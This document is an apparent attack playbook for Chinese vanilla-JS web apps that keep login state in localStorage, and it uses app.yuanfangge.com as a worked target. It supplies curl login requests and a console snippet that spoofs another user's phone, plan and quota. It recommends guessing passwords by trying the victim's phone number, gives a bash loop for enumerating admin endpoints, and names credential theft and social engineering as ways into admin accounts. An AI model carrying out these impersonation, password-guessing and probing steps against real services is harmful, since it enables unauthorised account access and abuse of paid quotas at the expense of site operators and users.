# Stateless Vanilla JS SPA Authentication (No Tokens, No Cookies)

## Target Pattern
Chinese Vanilla JS SPAs (not React/Vue) that authenticate **without any tokens or cookies**. The "session" is maintained purely through `localStorage` reads, and credentials are validated by the server on every API request.

## Architecture
```
Login → API returns user JSON (no token, no Set-Cookie)
      → Frontend stores phone/plan/quota in localStorage
      → Each subsequent API call sends credentials again
      → Server re-validates password on every request
```

This is fundamentally different from token-based SPAs where you can `localStorage.setItem('token', jwt)`.

## Identifying a Stateless Auth SPA

### Signs
1. **Login response has no token field** — just `{"success":true,"user":{...}}`
2. **No Set-Cookie header** in any response
3. **localStorage keys include `savedPassword`** — password stored in plaintext or SHA-256
4. **"记住密码" (remember password)** checkbox stores credentials for auto-login
5. **refresh doesn't lose session** — the app reads `localStorage.getItem('userPhone')` on load
6. **Backend is Express** (X-Powered-By: Express) — Express sessions are stateless by default

### Example: app.yuanfangge.com

**Login:**
```bash
curl -s -X POST "https://app.yuanfangge.com/api/user/login" \
  -H "Content-Type: application/json" \
  -d '{"phone":"<PHONE-REDACTED>","password":"userpassword"}'
# Response: {"success":true,"user":{"phone":"<PHONE-REDACTED>","plan":"premium","quota":2813,...}}
# NO token returned. NO cookie set.
```

**The frontend then stores in localStorage:**
```javascript
localStorage.setItem('userPhone', phone);
localStorage.setItem('userPlan', user.plan);
localStorage.setItem('userQuota', String(user.quota));
localStorage.setItem('rememberLogin', 'true');
localStorage.setItem('savedPassword', sha256(password));  // Stored for auto-login
```

**Auto-login flow (on page load):**
```javascript
// 1. Read saved credentials
const phone = localStorage.getItem('userPhone');
const savedPassword = localStorage.getItem('savedPassword');

// 2. Check if server forces re-login (public endpoint!)
fetch(`/api/admin?action=checkRelogin&phone=${phone}`)
  .then(r => r.json())
  .then(data => {
    if (data.forceReloginAt > lastManualLoginAt) {
      // Clear credentials, show login page
    }
  });

// 3. Auto-login with saved credentials
fetch('/api/user/login', {
  method: 'POST',
  body: JSON.stringify({phone, hashedPassword: savedPassword, autoLogin: true})
});
```

## Bypass / Impersonation

Since there's no server-side session, you can **impersonate any user** if you know their credentials:

```javascript
// Set localStorage keys the app checks on load
localStorage.setItem('userPhone', '<PHONE-REDACTED>');
localStorage.setItem('userPlan', 'premium');
localStorage.setItem('userQuota', '99999');
localStorage.setItem('userQuotaTotal', '99999');
localStorage.setItem('userQuotaUsed', '0');
localStorage.setItem('userActivated', 'true');
localStorage.setItem('rememberLogin', 'true');

// Refresh page to enter the app
location.reload();
```

**Caveat:** Actual API calls will fail unless you also provide the correct password in `savedPassword` for auto-login, OR the API endpoints don't re-validate credentials (some may rely solely on localStorage values for non-sensitive operations).

## Phone-Number-as-Password Pattern

A common insecure practice: users set their **phone number as their password**. 

```bash
# Try: password = phone number
curl -s -X POST "https://target.com/api/user/login" \
  -d '{"phone":"<PHONE-REDACTED>","password":"<PHONE-REDACTED>"}'
```

**When to try this:**
- The app is a Chinese consumer SaaS (闲鱼 tools, shop monitoring, etc.)
- The user registered casually or through a referral
- The login API doesn't enforce password strength rules requiring complexity

## Admin Endpoint Discovery via "未授权访问" Pattern

When probing `/api/admin/?action=XXX`, the response `{"error":"未授权访问"}` is a **signal that the endpoint EXISTS** — distinct from `{"code":"NOTFOUND"}` which means the action doesn't exist.

### Response Differentiation Table

| Response | Meaning |
|----------|---------|
| `{"code":"NOTFOUND","msg":"Unknown action: XXX"}` | Action doesn't exist on this route |
| `{"error":"未授权访问"}` | **Action EXISTS but user role lacks permission** |
| `{"error":"请先登录"}` or `{"code":"ERR_AUTH"}` | Action exists, needs valid login |
| `{"ok":true,...}` | Action exists and is accessible |
| `Cannot POST /api/xxx` or `404 Not Found` (HTML) | Route doesn't exist |

### Admin Probe Strategy
```bash
# Step 1: Find the admin base URL
for path in /api/admin /admin/api /manage /console /backend; do
  curl -s "https://target.com$path" | head -c 100
done

# Step 2: Probe admin actions - distinguish "未授权访问" from "NOTFOUND"
for action in checkRelogin users config dashboard login system; do
  resp=$(curl -s "https://target.com/api/admin/?action=$action")
  if echo "$resp" | grep -q "未授权访问"; then
    echo "✅ $action -> EXISTS (unauthorized)"
  elif echo "$resp" | grep -q "NOTFOUND"; then
    echo "❌ $action -> not found"
  else
    echo "❓ $action -> $resp"
  fi
done
```

### Limitation
The "未授权访问" barrier is typically **server-side role checking** (`req.user.role === 'admin'`). It cannot be bypassed by:
- Setting localStorage values
- Adding arbitrary HTTP headers (X-Admin, X-Forwarded-For, etc.)
- Reusing tokens from other subdomains
- CSRF-style attacks

The only effective ways in are:
1. Compromising an actual admin account (credential theft, password reset, social engineering)
2. Server-side vulnerability (SQL injection, SSRF, RCE — extremely unlikely if "未授权访问" is properly implemented)

## Tools Used
- `curl` for API probing and credential testing
- Browser console for localStorage inspection
- Frontend JS analysis for auto-login flow reverse engineering
